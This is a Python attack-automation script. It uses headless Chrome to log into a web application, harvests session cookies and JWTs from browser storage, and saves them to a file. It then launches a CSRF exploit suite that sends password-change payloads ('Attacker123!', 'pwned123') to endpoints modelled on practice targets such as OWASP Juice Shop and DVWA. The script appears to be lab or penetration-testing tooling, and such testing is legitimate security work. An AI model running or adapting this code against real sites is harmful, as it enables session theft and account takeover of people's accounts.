#!/usr/bin/env python3
import argparse, json, subprocess, time
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

def login_and_get_tokens(base, login_path, user, pwd, user_field, pwd_field):
    # Launch headless Chrome
    options = Options()
    options.add_argument("--headless=new")  # headless mode
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    driver = webdriver.Chrome(options=options)

    login_url = urljoin(base, login_path)
    print(f"[+] Navigating to {login_url}")
    driver.get(login_url)

    # Fill login form
    print(f"[+] Filling login form with {user=}")
    driver.find_element(By.CSS_SELECTOR, user_field).send_keys(user)
    driver.find_element(By.CSS_SELECTOR, pwd_field).send_keys(pwd)
    driver.find_element(By.CSS_SELECTOR, pwd_field).send_keys(Keys.RETURN)
    time.sleep(3)  # wait for login to finish

    # Grab cookies
    cookies = driver.get_cookies()
    print(f"[+] Retrieved cookies: {[c['name'] for c in cookies]}")

    # Grab JWTs (check localStorage + sessionStorage)
    jwt_token = None
    for key in ["token", "jwt", "auth", "access_token"]:
        try:
            val = driver.execute_script(f"return window.localStorage.getItem('{key}')")
            if val: 
                jwt_token = val; break
        except: pass
        try:
            val = driver.execute_script(f"return window.sessionStorage.getItem('{key}')")
            if val: 
                jwt_token = val; break
        except: pass

    if jwt_token:
        print(f"[+] Retrieved JWT: {jwt_token[:40]}...")

    driver.quit()
    return cookies, jwt_token


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="Base site URL (e.g. https://juice-shop.herokuapp.com/)")
    ap.add_argument("--login-path", required=True, help="Login page path (e.g. /#/login or /login)")
    ap.add_argument("--username", required=True)
    ap.add_argument("--password", required=True)
    ap.add_argument("--username-field", default="input[name='email']", help="CSS selector for username/email field")
    ap.add_argument("--password-field", default="input[name='password']", help="CSS selector for password field")
    ap.add_argument("--out", default="session.json", help="Where to save extracted session data")
    args = ap.parse_args()

    cookies, jwt = login_and_get_tokens(
        args.base, args.login_path, args.username, args.password, args.username_field, args.password_field
    )

    session = {
        "base": args.base,
        "cookies": cookies,
        "jwt": jwt
    }
    with open(args.out, "w") as f:
        json.dump(session, f, indent=2)
    print(f"[+] Saved session tokens to {args.out}")

    # Auto-call CSRF Suite
    if jwt:
        print("[+] Running CSRF suite with JWT...")
        subprocess.run([
            "python3", "auto_run.py",
            "--base", args.base,
            "--auth-header", f"Authorization: Bearer {jwt}",
            "--add-post", f"{args.base}/rest/user/change-password current=oldpass&new=Attacker123!&repeat=Attacker123!",
            "--body-format", "json",
            "--exploits-only"
        ])
    elif cookies:
        sess = next((c for c in cookies if c["name"].lower() in ["phpsessid", "sessionid"]), None)
        if sess:
            print(f"[+] Running CSRF suite with cookie {sess['name']}...")
            subprocess.run([
                "python3", "auto_run.py",
                "--base", args.base,
                "--cookie", f"{sess['name']}={sess['value']}",
                "--cookies", "security=low",
                "--add-post", f"{args.base}/vulnerabilities/csrf/ password_new=pwned123&password_conf=pwned123&Change=Change",
                "--body-format", "form",
                "--exploits-only"
            ])
        else:
            print("[!] No session cookie found, please adjust selectors.")
